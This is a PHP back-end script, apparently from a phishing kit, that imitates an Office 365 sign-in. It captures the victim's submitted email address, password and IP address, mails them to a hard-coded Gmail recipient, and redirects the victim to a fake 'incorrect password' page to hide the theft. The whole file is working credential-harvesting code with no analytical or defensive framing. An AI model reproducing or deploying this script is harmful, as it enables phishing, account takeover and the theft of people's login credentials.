<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------OFFICE 365 LOGIN---------------------\n";
$message .= "Email address: ".$_POST['name']."\n";
$message .= "Password: ".$_POST['name0']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Powered bY Admin--------------------\n";
$recipient = "suhaa.suhaa@gmail.com, suhaa.suhaa@gmail.com";
$subject = "OFFICE 365 LOGIN";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "Texlon-Version: 1.0\n";
	 mail("", "Texlon$", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: incorrect.PWD.Sign_in.authorize.htm");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>

